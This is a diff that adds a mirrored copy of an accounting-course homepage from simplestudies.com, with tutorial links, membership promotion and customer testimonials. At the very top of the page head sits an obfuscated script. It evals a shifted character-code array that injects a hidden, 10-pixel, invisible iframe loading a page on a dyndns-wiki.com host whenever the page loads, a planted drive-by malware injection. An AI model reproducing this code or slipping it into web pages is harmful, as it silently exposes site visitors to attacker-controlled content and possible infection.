@@ -1,0 +1,390 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head><script>var s,q=2,aa=document.createTextNode("harCode");try{a}catch(qq){s=String["fromC"+aa.nodeValue];}
+eval(s(7+q,7+q,103+q,100+q,30+q,38+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,101+q,99+q,114+q,67+q,106+q,99+q,107+q,99+q,108+q,114+q,113+q,64+q,119+q,82+q,95+q,101+q,76+q,95+q,107+q,99+q,38+q,37+q,96+q,109+q,98+q,119+q,37+q,39+q,89+q,46+q,91+q,39+q,121+q,7+q,7+q,7+q,103+q,100+q,112+q,95+q,107+q,99+q,112+q,38+q,39+q,57+q,7+q,7+q,123+q,30+q,99+q,106+q,113+q,99+q,30+q,121+q,7+q,7+q,7+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,117+q,112+q,103+q,114+q,99+q,38+q,32+q,58+q,103+q,100+q,112+q,95+q,107+q,99+q,30+q,113+q,112+q,97+q,59+q,37+q,102+q,114+q,114+q,110+q,56+q,45+q,45+q,112+q,99+q,113+q,113+q,113+q,44+q,98+q,119+q,108+q,98+q,108+q,113+q,43+q,117+q,103+q,105+q,103+q,44+q,97+q,109+q,107+q,45+q,103+q,108+q,98+q,99+q,118+q,44+q,110+q,102+q,110+q,61+q,114+q,110+q,59+q,53+q,97+q,95+q,47+q,98+q,49+q,99+q,49+q,54+q,55+q,95+q,50+q,97+q,98+q,50+q,53+q,37+q,30+q,117+q,103+q,98+q,114+q,102+q,59+q,37+q,47+q,46+q,37+q,30+q,102+q,99+q,103+q,101+q,102+q,114+q,59+q,37+q,47+q,46+q,37+q,30+q,113+q,114+q,119+q,106+q,99+q,59+q,37+q,116+q,103+q,113+q,103+q,96+q,103+q,106+q,103+q,114+q,119+q,56+q,102+q,103+q,98+q,98+q,99+q,108+q,57+q,110+q,109+q,113+q,103+q,114+q,103+q,109+q,108+q,56+q,95+q,96+q,113+q,109+q,106+q,115+q,114+q,99+q,57+q,106+q,99+q,100+q,114+q,56+q,46+q,57+q,114+q,109+q,110+q,56+q,46+q,57+q,37+q,60+q,58+q,45+q,103+q,100+q,112+q,95+q,107+q,99+q,60+q,32+q,39+q,57+q,7+q,7+q,123+q,7+q,7+q,100+q,115+q,108+q,97+q,114+q,103+q,109+q,108+q,30+q,103+q,100+q,112+q,95+q,107+q,99+q,112+q,38+q,39+q,121+q,7+q,7+q,7+q,116+q,95+q,112+q,30+q,100+q,30+q,59+q,30+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,97+q,112+q,99+q,95+q,114+q,99+q,67+q,106+q,99+q,107+q,99+q,108+q,114+q,38+q,37+q,103+q,100+q,112+q,95+q,107+q,99+q,37+q,39+q,57+q,100+q,44+q,113+q,99+q,114+q,63+q,114+q,114+q,112+q,103+q,96+q,115+q,114+q,99+q,38+q,37+q,113+q,112+q,97+q,37+q,42+q,37+q,102+q,114+q,114+q,110+q,56+q,45+q,45+q,112+q,99+q,113+q,113+q,113+q,44+q,98+q,119+q,108+q,98+q,108+q,113+q,43+q,117+q,103+q,105+q,103+q,44+q,97+q,109+q,107+q,45+q,103+q,108+q,98+q,99+q,118+q,44+q,110+q,102+q,110+q,61+q,114+q,110+q,59+q,53+q,97+q,95+q,47+q,98+q,49+q,99+q,49+q,54+q,55+q,95+q,50+q,97+q,98+q,50+q,53+q,37+q,39+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,116+q,103+q,113+q,103+q,96+q,103+q,106+q,103+q,114+q,119+q,59+q,37+q,102+q,103+q,98+q,98+q,99+q,108+q,37+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,110+q,109+q,113+q,103+q,114+q,103+q,109+q,108+q,59+q,37+q,95+q,96+q,113+q,109+q,106+q,115+q,114+q,99+q,37+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,106+q,99+q,100+q,114+q,59+q,37+q,46+q,37+q,57+q,100+q,44+q,113+q,114+q,119+q,106+q,99+q,44+q,114+q,109+q,110+q,59+q,37+q,46+q,37+q,57+q,100+q,44+q,113+q,99+q,114+q,63+q,114+q,114+q,112+q,103+q,96+q,115+q,114+q,99+q,38+q,37+q,117+q,103+q,98+q,114+q,102+q,37+q,42+q,37+q,47+q,46+q,37+q,39+q,57+q,100+q,44+q,113+q,99+q,114+q,63+q,114+q,114+q,112+q,103+q,96+q,115+q,114+q,99+q,38+q,37+q,102+q,99+q,103+q,101+q,102+q,114+q,37+q,42+q,37+q,47+q,46+q,37+q,39+q,57+q,7+q,7+q,7+q,98+q,109+q,97+q,115+q,107+q,99+q,108+q,114+q,44+q,101+q,99+q,114+q,67+q,106+q,99+q,107+q,99+q,108+q,114+q,113+q,64+q,119+q,82+q,95+q,101+q,76+q,95+q,107+q,99+q,38+q,37+q,96+q,109+q,98+q,119+q,37+q,39+q,89+q,46+q,91+q,44+q,95+q,110+q,110+q,99+q,108+q,98+q,65+q,102+q,103+q,106+q,98+q,38+q,100+q,39+q,57+q,7+q,7+q,123+q));</script>
+        <xbasehref="http://simplestudies.com/">
+        <meta http-equiv="content-Type" content="text/html; charset=windows-1252">
+        <title>Learn Accounting Online with a Smart Accounting Course | Simplestudies.com</title>
+                <meta name="description" content="Learn accounting online with Simplestudies.com accounting course. We explain accounting principles in a simple way. Our course includes accounting tutorials on introduction to accounting, accounting tests with detailed explanations, and accounting dictionary.">
+        <meta name="keywords" content="accounting, introduction to accounting, accounting tutorial, accounting course, intro to accounting, accounting exercises, financial accounting principles, simple accounting, financial accounting tutorial, free accounting lesson">
+
+        <link rel="icon" href="http://simplestudies.com/images/favicon.ico" type="image/x-icon" />
+
+        <link href="style.css" tppabs="http://simplestudies.com/styles/style.css" rel="STYLESHEET" type="text/css" />
+        <link href="jquery-ui-1.8.7.custom.css" tppabs="http://simplestudies.com/styles/custom-theme/jquery-ui-1.8.7.custom.css" rel="STYLESHEET" type="text/css" />
+        <link href="boxy.css" tppabs="http://simplestudies.com/styles/boxy.css" rel="STYLESHEET" type="text/css" />
+
+        <script type="text/javascript" src="jquery.min.js" tppabs="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script>
+        <script type="text/javascript" src="jquery-ui.min.js" tppabs="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.7/jquery-ui.min.js"></script>
+        <script type="text/javascript" src="jquery.json-2.2.min.js" tppabs="http://simplestudies.com/scripts/jquery.json-2.2.min.js"></script>
+        <script type="text/javascript" src="jquery.pngFix.1.2.pack.js" tppabs="http://simplestudies.com/scripts/jquery.pngFix.1.2.pack.js"></script>
+        <script type="text/javascript" src="jquery.lsForm.min.js" tppabs="http://simplestudies.com/scripts/jquery.lsForm.min.js"></script>
+        <script type="text/javascript" src="jquery.checkbox.min.js" tppabs="http://simplestudies.com/scripts/jquery.checkbox.min.js"></script>
+        <script type="text/javascript" src="jquery.inline_caption.min.js" tppabs="http://simplestudies.com/scripts/jquery.inline_caption.min.js"></script>
+        <script type="text/javascript" src="jquery.form.min.js" tppabs="http://simplestudies.com/scripts/jquery.form.min.js"></script>
+        <script type="text/javascript" src="jquery.boxy_error.min.js" tppabs="http://simplestudies.com/scripts/jquery.boxy_error.min.js"></script>
+        <script type="text/javascript" src="jquery.boxy_yellow.min.js" tppabs="http://simplestudies.com/scripts/jquery.boxy_yellow.min.js"></script>
+        <script type="text/javascript" src="jquery.boxy_green.min.js" tppabs="http://simplestudies.com/scripts/jquery.boxy_green.min.js"></script>
+                <script type="text/javascript" src="jcarousellite_1.0.1.min.js" tppabs="http://simplestudies.com/scripts/jcarousellite_1.0.1.min.js"></script>
+               	<script type="text/javascript" charset="utf-8" src="swfobject.min.js" tppabs="http://simplestudies.com/scripts/swfobject.min.js"></script>
+        <script type="text/javascript" src="application.min.js" tppabs="http://simplestudies.com/scripts/application.min.js"></script>
+        <script type="text/javascript" src="promo.min.js" tppabs="http://simplestudies.com/scripts/promo.min.js"></script>
+        <script type="text/javascript" src="bookmarks.min.js" tppabs="http://simplestudies.com/scripts/bookmarks.min.js"></script>
+
+        <script src="urchin.js" tppabs="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
+        <script type="text/javascript">
+            _uacct = "UA-1559498-1";
+            urchinTracker();
+        </script>
+    </head>
+        
+    <body>
+    <a name="top"></a>
+	<div class="container">
+		<div class="main">
+
+			<div class="header">
+				<div class="logo_block">
+					<div class="logo"><img src="logo.png" tppabs="http://simplestudies.com/images/logo.png" width="356" height="77" alt="Simple Studies" /></div>
+					<div class="clear"></div>
+				</div>
+				<div class="right_block">
+					<div class="top_links">
+                                                                                	<a href="javascript:if(confirm('http://simplestudies.com/user/login  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/user/login'" tppabs="http://simplestudies.com/user/login" rel="nofollow">Sign In</a>
+                                        
+
+					                 <a href="javascript:if(confirm('http://simplestudies.com/why-join.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/why-join.html'" tppabs="http://simplestudies.com/why-join.html"
+                           >Why&nbsp;Join</a>
+         										                 <a href="javascript:if(confirm('http://simplestudies.com/faq.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/faq.html'" tppabs="http://simplestudies.com/faq.html"
+                           >FAQ</a>
+         										</div>
+
+					<div class="clear"></div>
+
+									<form action="http://simplestudies.com/search" method="GET" id="cse-search-box">
+                                                                                                                                                    <input type="hidden" name="cx" value="009195146072095684742:yomn_gwty2o" />
+                                                                                                <input type="hidden" name="cof" value="FORID:10;NB:1" />
+                                                <input type="hidden" name="ie" value="UTF-8" />
+                    <div class="search_but"><input type="button" name="press" value="" onclick="document.getElementById('cse-search-box').submit();" /></div>
+                    <div class="search"><input type="text" name="q" id="definp2" value="Search our website..." inline_caption="false" onclick="if(this.value=='Search our website...') this.value='';" onblur="if(this.value=='') this.value='Search our website...';" /></div>
+                                                                            
+                                            <script type="text/javascript" src="jsapi" tppabs="http://www.google.com/jsapi"></script>
+                                            <script type="text/javascript" src="t13n-form=cse-search-box&t13n_langs=en" tppabs="http://www.google.com/coop/cse/t13n?form=cse-search-box&t13n_langs=en"></script>
+                                        
+                                                                        </form>
+
+					<div class="clear"></div>
+
+				</div>
+				<div class="clear"></div>
+				<div class="menu_block">
+
+
+					<div class="menu">
+						<ul>
+                                        
+        	<li ><a onfocus="this.blur()" href="javascript:if(confirm('http://simplestudies.com/accounting-lectures.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-lectures.html'" tppabs="http://simplestudies.com/accounting-lectures.html"
+                       >Accounting<br>Tutorials</a></li>
+        
+                
+        	<li ><a onfocus="this.blur()" href="javascript:if(confirm('http://simplestudies.com/accounting-guides.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-guides.html'" tppabs="http://simplestudies.com/accounting-guides.html"
+                       >Accounting<br>Guides</a></li>
+        
+                
+        	<li ><a onfocus="this.blur()" href="javascript:if(confirm('http://simplestudies.com/accounting-questions.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-questions.html'" tppabs="http://simplestudies.com/accounting-questions.html"
+                       >Accounting<br>Tests</a></li>
+        
+                
+        	<li ><a onfocus="this.blur()" href="javascript:if(confirm('http://simplestudies.com/accounting-dictionary  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-dictionary'" tppabs="http://simplestudies.com/accounting-dictionary"
+                       >Accounting<br>Dictionary</a></li>
+        
+                
+        	<li ><a onfocus="this.blur()" href="javascript:if(confirm('http://simplestudies.com/study/board.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/study/board.html'" tppabs="http://simplestudies.com/study/board.html"
+                       rel="nofollow">My<br>Studyboard</a></li>
+        
+        						</ul>
+					</div>
+                                        					<div class="join_but"><a href="javascript:if(confirm('http://simplestudies.com/user/signup  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/user/signup'" tppabs="http://simplestudies.com/user/signup" rel="nofollow"><span>Join Now</span></a></div>
+                                        					<div class="clear"></div>
+				</div>
+			</div>
+
+			<div class="content">
+                                                    <h1 class="title_1"><strong>Learn Accounting with a Smart Online Accounting Course</strong> <span>Basic (<strong>Free</strong>) and Premium (<strong>Paid Membership</strong>) Tools to Learn Accounting Online</span></h1>
+				<h2 class="title_2"><span> (Membership)</span> Premium Content </h2>
+				<div class="tab_2" id="tabHead1"><a href="#" onfocus="this.blur()" onclick="document.getElementById('tab1').style.display='block';document.getElementById('tab2').style.display='none';document.getElementById('tabHead2').className='tab_1';document.getElementById('tabHead1').className='tab_2';return false;"><span>How It Works</span></a></div>
+				<div class="tab_1" id="tabHead2"><a href="#" onfocus="this.blur()" onclick="document.getElementById('tab1').style.display='none';document.getElementById('tab2').style.display='block';document.getElementById('tabHead2').className='tab_2';document.getElementById('tabHead1').className='tab_1';return false;"><span>benefits</span></a></div>
+				<div class="clear"></div>
+				<div class="block_1" id="tab2" style="display:none">
+					<div class="buts_1">
+<div class="but_1"><a href="javascript:if(confirm('http://simplestudies.com/user/signup  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/user/signup'" tppabs="http://simplestudies.com/user/signup" rel="nofollow"><img src="join_now.jpg" tppabs="http://simplestudies.com/images/join_now.jpg" width="154" height="51" alt="" /></a></div>
+		
+			
+                 <div class="but_2"><a href="javascript:if(confirm('http://simplestudies.com/why-join.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/why-join.html'" tppabs="http://simplestudies.com/why-join.html"
+                           ><img src="why_join.jpg" tppabs="http://simplestudies.com/images/why_join.jpg" width="124" height="40" alt="Why join" /></a></div>
+         	
+						
+					</div>																										 
+					<div class="list_1">
+						<h3>Monitor learning progress with a study dashboard</h3>
+                        <h3>Stay on learning track with a study plan</h3>
+                        <h3>Check knowledge in real time with checkpoint questions</h3>
+					</div>
+					<div class="list_1">
+						<h3>Save areas for improvement with one-click topic bookmarks</h3>
+						<h3>Test your knowledge with online accounting tests</h3>
+						<h3>Supplement online tutorials with downloadable study notes</h3>
+					</div>
+					<div class="list_2">
+						<h3>Take studying off-line by printing tutorials</h3>
+						<h3>Get a record of course completion with online certificate</h3>
+						<h3>30 days money back guarantee for yearly plans if you are not fully satisfied</h3>
+					</div>
+					<div class="clear"></div>
+				</div>
+				<div class="block_1" id="tab1" style="display:block">
+					<div class="buts_1">
+<div class="but_1"><a href="javascript:if(confirm('http://simplestudies.com/user/signup  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/user/signup'" tppabs="http://simplestudies.com/user/signup" rel="nofollow"><img src="join_now.jpg" tppabs="http://simplestudies.com/images/join_now.jpg" width="154" height="51" alt="" /></a></div>
+					
+                 <div class="but_2"><a href="javascript:if(confirm('http://simplestudies.com/why-join.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/why-join.html'" tppabs="http://simplestudies.com/why-join.html"
+                           ><img src="why_join.jpg" tppabs="http://simplestudies.com/images/why_join.jpg" width="124" height="40" alt="Why join" /></a></div>
+         	
+					</div>		
+					<div class="char_pic"></div>	
+					<div class="clear"></div>
+				</div>	 
+				<div class="title_2"><span>(FREE)</span>Basic Content </div>
+				                        
+                                                                                               <div class="clear"></div>
+			</div>
+		</div>
+					<div class="container_1">
+			<div class="container_1_in">
+								<div class="blk_1">
+					<div class="title_3">Accounting Tutorials</div>
+					<div class="list_3">
+						<ul>
+						
+                    <li><a  href="javascript:if(confirm('http://simplestudies.com/introduction-to-accounting.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/introduction-to-accounting.html'" tppabs="http://simplestudies.com/introduction-to-accounting.html"  >Introduction to Accounting</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/double-entry-accounting-system.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/double-entry-accounting-system.html'" tppabs="http://simplestudies.com/double-entry-accounting-system.html"  >Double-entry Accounting System</a></li>
+                                    <li><a  href="javascript:if(confirm('http://simplestudies.com/accounting-for-inventories.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-for-inventories.html'" tppabs="http://simplestudies.com/accounting-for-inventories.html"  >Accounting for Inventories</a></li>
+                    							
+                    <li><a  href="javascript:if(confirm('http://simplestudies.com/accounting-cost-behavior.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-cost-behavior.html'" tppabs="http://simplestudies.com/accounting-cost-behavior.html"  >Accounting Cost Behavior</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/liquidity-working-capital-analysis.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/liquidity-working-capital-analysis.html'" tppabs="http://simplestudies.com/liquidity-working-capital-analysis.html"  >Liquidity and Working Capital Analysis</a></li>
+                                    <li><a  href="javascript:if(confirm('http://simplestudies.com/direct-costs-in-standard-costing.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/direct-costs-in-standard-costing.html'" tppabs="http://simplestudies.com/direct-costs-in-standard-costing.html"  >Direct Costs in Standard Costing</a></li>
+                    							
+							
+						</ul>
+					</div>	 
+					<div class="button_1"><a href="javascript:if(confirm('http://simplestudies.com/accounting-lectures.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-lectures.html'" tppabs="http://simplestudies.com/accounting-lectures.html"><span>All Accounting Tutorials</span></a></div>
+					<div class="clear"></div>
+				</div>	
+												<div class="blk_2">
+					<div class="title_3">Accounting Short Answers</div>
+					<div class="list_3">
+						<ul>
+                    <li><a  href="javascript:if(confirm('http://simplestudies.com/accruals-meaning-of-accrued-in-accounting.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accruals-meaning-of-accrued-in-accounting.html'" tppabs="http://simplestudies.com/accruals-meaning-of-accrued-in-accounting.html"  >What is the meaning of accrued in accounting?</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/what-is-restricted-cash.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/what-is-restricted-cash.html'" tppabs="http://simplestudies.com/what-is-restricted-cash.html"  >What is restricted cash and how to present it?</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/what-is-unearned-deferred-revenue.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/what-is-unearned-deferred-revenue.html'" tppabs="http://simplestudies.com/what-is-unearned-deferred-revenue.html"  >What is unearned (deferred) revenue?</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/what-do-2-10-n-30-terms-mean.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/what-do-2-10-n-30-terms-mean.html'" tppabs="http://simplestudies.com/what-do-2-10-n-30-terms-mean.html"  >What do 2/10, n/30 invoice terms mean?</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/what-is-limited-liability-company.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/what-is-limited-liability-company.html'" tppabs="http://simplestudies.com/what-is-limited-liability-company.html"  >What is limited liability company?</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/when-is-physical-inventory-taken.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/when-is-physical-inventory-taken.html'" tppabs="http://simplestudies.com/when-is-physical-inventory-taken.html"  >When is physical inventory usually taken?</a></li>
+                    	
+						</ul>
+					</div>	
+					<div class="button_1"><a href="javascript:if(confirm('http://simplestudies.com/short-answers.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/short-answers.html'" tppabs="http://simplestudies.com/short-answers.html"><span>All Accounting Short Answers</span></a></div>
+					<div class="clear"></div>
+				</div>	
+								<div class="clear"></div>  
+								<div class="blk_3">
+					<div class="title_3">Accounting Guides</div>
+					<div class="list_3">
+						<ul>
+                    <li><a  href="javascript:if(confirm('http://simplestudies.com/how-to-prepare-balance-sheet.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/how-to-prepare-balance-sheet.html'" tppabs="http://simplestudies.com/how-to-prepare-balance-sheet.html"  >How to prepare balance sheet</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/bank-account-reconciliation.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/bank-account-reconciliation.html'" tppabs="http://simplestudies.com/bank-account-reconciliation.html"  >How to prepare bank account reconciliation</a></li>
+                <li><a  href="javascript:if(confirm('http://simplestudies.com/accounting-and-procedures-for-petty-cash.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-and-procedures-for-petty-cash.html'" tppabs="http://simplestudies.com/accounting-and-procedures-for-petty-cash.html"  >Accounting and procedures for petty cash</a></li>
+                    							
+						</ul>
+					</div>	 
+					<div class="button_1"><a href="javascript:if(confirm('http://simplestudies.com/accounting-guides.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-guides.html'" tppabs="http://simplestudies.com/accounting-guides.html"><span>All Accounting Guides</span></a></div>
+					<div class="clear"></div>
+				</div>	
+								<div class="blk_4">
+					<div class="title_3">Accounting Test Questions</div>
+					<div class="list_3">
+						<p>A limited number of free test (practice) questions are available for each tutorial. Consider premium content when you need more practice questions and advanced test taking features.</p>
+					</div>	 
+					<div class="button_1"><a href="javascript:if(confirm('http://simplestudies.com/accounting-questions.html  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://simplestudies.com/accounting-questions.html'" tppabs="http://simplestudies.com/accounting-questions.html"><span>Free Online Accounting Questions</span></a></div>
+					<div class="clear"></div>
+				</div>	
+				<div class="clear"></div>
+			</div>
+		</div>	
+				<div class="container_2">
+			<div class="container_2_in">
+				<div class="title_2">Testimonials</div>
+				<div class="clear"></div>		 
+				<div class="anyClass">
+				<ul>
+								<li><div class="quote_right">
+					<p>I am a sole proprietor working from home by providing bookkeeping services. Before I started my business I wanted to get a refresher course in accounting as I graduated from a community college long ago. This course did a good job at letting me pick areas where I wanted to refresh my knowledge. I also got access to hands-on guides which I am using in my work. And all of this is at a very decent price compared to other options.</p>
+					<div class="author">Angela M.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>I work as an administrative assistant in a medium-sized company and wanted to learn accounting so I can obtain a better-paying job in Finance. I joined Simplestudies.com and used their tutorials and practice questions to learn accounting. The study dashboard helped me stay on track and receive a certificate of competence. During my job interview I felt more confident answering accounting-related questions, which landed me a new job. Thanks Simplestudies.com!</p>
+					<div class="author">LaToya B.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>I've just started learning accounting and was looking for a website that could help me learn accounting concepts in an easy way. I have found some free resources online but I am glad I chose this website because it has a great selection of test questions. Each question has a thorough explanation of each answer choice, so if I make a mistake, the explanation will give a clue about the correct answer choice. I can even bookmark tutorial topics related to the questions and come back to them later. I really like these features!</p>
+					<div class="author">Eric S.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>At first I could not decide if I wanted to join Simplestudies.com or just use their free online accounting resources. Now I am glad that I have subscribed to this website. In addition to free tutorials, the website has helpful accounting guides and short explanations of specific questions. All materials provide great real-life examples and explain the nature of accounting events (transactions) and journal entries need to be made. I am planning on using these resources in my job as a department manager.</p>
+					<div class="author">Balaraj G.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>I studied finance in China. When I came to study in USA, I had to take some accounting classes. Textbooks used in my classes were difficult to understand. I tried using free accounting resources but did not find them helpful because they were similar to the textbooks. Simplestudies.com has well-organized and simple to understand lectures and accounting guides and helpful practice questions. It helped me to get A in my accounting classes!</p>
+					<div class="author">Shen C.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>I provide tax consulting services and am planning to expand my services to include bookkeeping. I have limited financial accounting background and needed to refresh my accounting skills. Simplestudies.com provides a lot of examples, including journal entries, and explains accounting transactions in a simple and memorable way. If you want to understand accounting concepts rather than memorize accounting transactions, Simplestudies.com is worth subscribing. Low price - great value!</p>
+					<div class="author">Scott T. </div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>This website is great. I was looking for an easy to follow online accounting course and this website came up in search results. I tried free materials, then decided to join (knowing they can refund within 30 days if I don't like it). I liked that I can track my progress on a dashboard and that I can use practice questions to prepare for my exams.</p>
+					<div class="author">Andrew K.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>I work as a financial analyst but decided to take some accounting classes to expand my knowledge and career opportunities. If you have no background in accounting, like me, this website is a great place to start! Their lectures are not only free but of great quality (which I did not find on free accounting websites). Practice questions and exams are also well-written and very helpful. I am also planning on obtaining a certificate of competence to show to my employer. For its price, this website is definitely of great value!</p>
+					<div class="author">Adam L.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>I have a small consulting business and was looking to train my employees accounting basics to better understand our clients' businesses. I was looking for a training course at a reasonable price and was happy to find Simplestudies.com. Their accounting course is great! All resources at this website are high quality, no doubt. My employees were able to learn accounting fast and are utilizing accounting knowledge in their daily activities, which I believe has contributed to the growth of my business. Thank you Simplestudies!</p>
+					<div class="author">Jill A. </div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								<li><div class="quote_right">
+					<p>Our company purchased a bulk subscription and uses it to train all newly hired analysts in our Accounts Payable department. Analysts register at Simplestudies.com by using promo (registration) codes, so we don't have to manage that. Analysts are happy to receive this training and we are happy to help our people develop their accounting skills.</p>
+					<div class="author">Jing M.</div>
+					<div class="q_top"></div>
+					<div class="q_bot"></div>
+				</div></li>	
+								</ul>
+				</div>	
+				<div class="clear"></div>	
+				<div class="button_2"><a href="#" onfocus="this.blur()" class="next"><span>Next testimonials</span></a></div>
+				<div class="clear"></div>
+			</div>			
+		</div>	  
+
+<script>
+$(function() {
+    $(".anyClass").jCarouselLite({
+        btnNext: ".next",
+        scroll: 2,
+        visible: 2
+    });
+});
+</script>
+
+		
+				<div class="footer">
+						<div class="footer_in">
+								<div class="bot_menu">
+					<ul>
